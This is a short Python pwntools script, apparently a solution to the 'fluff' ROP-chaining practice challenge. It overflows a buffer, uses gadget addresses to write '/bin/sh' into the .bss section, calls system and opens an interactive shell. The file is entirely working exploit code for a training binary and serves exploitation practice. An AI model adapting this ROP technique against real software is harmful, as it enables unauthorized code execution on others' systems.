from pwn import *

context.log_level = 'debug'
p = process("./fluff")

sys_addr = 0x00000000004005e0
bss_addr = 0x0000000000601060
mov_r10p_r11 = 0x000000000040084e
pop_r12 = 0x0000000000400832
xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
xchg_r11_r10 = 0x0000000000400840
pop_rdi = 0x00000000004008c3

payload = ''
payload += "A"*40
#step1:push bss_addr into r10
payload += p64(pop_r12)
payload += p64(bss_addr)
#reset r11
payload += p64(xor_r11_r11)
payload += p64(0)
payload += p64(xor_r11_r12)
payload += p64(0)
payload += p64(xchg_r11_r10)
payload += p64(0)
#step2:push /bin/sh\x00 into r11
payload += p64(pop_r12)
payload += "/bin/sh\x00"
payload += p64(xor_r11_r11)
payload += p64(0)
payload += p64(xor_r11_r12)
payload += p64(0)
#step3:push r11 into r10p(bss)
payload += p64(mov_r10p_r11)
payload += p64(0)
payload += p64(0)
#step4:push bss_addr into rdi & call system
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(sys_addr)

p.sendline(payload)
p.interactive()

